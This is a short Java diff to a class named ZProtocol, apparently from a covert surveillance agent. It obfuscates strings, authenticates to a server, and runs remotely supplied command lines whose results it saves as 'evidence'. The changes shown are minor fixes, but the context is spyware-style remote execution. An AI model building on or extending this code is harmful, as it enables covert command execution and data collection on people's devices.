@@ -64,6 +64,7 @@ public class ZProtocol extends Protocol {
 	 */
 	public ZProtocol() {
 		try {
+			//6_1=SHA1PRNG
 			random = SecureRandom.getInstance(Messages.getString("6_1")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
 			if (Cfg.EXCEPTION) {
@@ -481,6 +482,9 @@ public class ZProtocol extends Protocol {
 	 */
 	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
 		if (authResult == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: null result"); //$NON-NLS-1$
+			}
 			throw new ProtocolException(100);
 		}
 		if (new String(authResult).contains(Messages.getString("6_0"))) { //$NON-NLS-1$
@@ -666,7 +670,7 @@ public class ZProtocol extends Protocol {
 
 				Date date = null;
 				if (time > 0) {
-					date = new Date(time * 1000);
+					date = new Date(time * 1000L);
 				}
 
 				if (Cfg.DEBUG) {
@@ -996,7 +1000,6 @@ public class ZProtocol extends Protocol {
 					executionLine = Directory.expandMacro(executionLine);
 
 					ExecuteResult ret = Execute.execute(executionLine);
-
 					ret.saveEvidence();
 					
 				}
